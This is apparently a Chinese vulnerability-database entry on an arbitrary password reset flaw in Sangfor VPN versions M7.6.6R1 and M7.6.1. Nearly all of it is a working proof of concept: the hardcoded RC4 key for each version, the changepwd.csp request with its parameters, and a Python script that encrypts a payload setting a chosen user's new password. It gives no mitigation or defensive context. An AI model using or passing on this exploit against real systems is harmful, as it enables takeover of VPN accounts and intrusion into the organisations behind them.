---
title: '深信服VPN任意密码重置'
date: Thu, 17 Sep 2020 04:56:37 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

已知M7.6.6R1 M7.6.1 其他版本有待测试

### 漏洞POC

M7.6.6R1 key 为 20181118 M7.6.1 key 为 20100720```
https://<path>/por/changepwd.csp

sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN 
``````
计算RC4_STR_LEN脚本
from Crypto.Cipher import ARC4
from binascii import a2b_hex

def myRC4(data,key):
    rc41 = ARC4.new(key)
    encrypted = rc41.encrypt(data)
    return encrypted.encode('hex')


def rc4_decrpt_hex(data,key):
    rc41 = ARC4.new(key)
    return rc41.decrypt(a2b_hex(data))
key = '20100720'
data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,'
print myRC4(data, key) 
```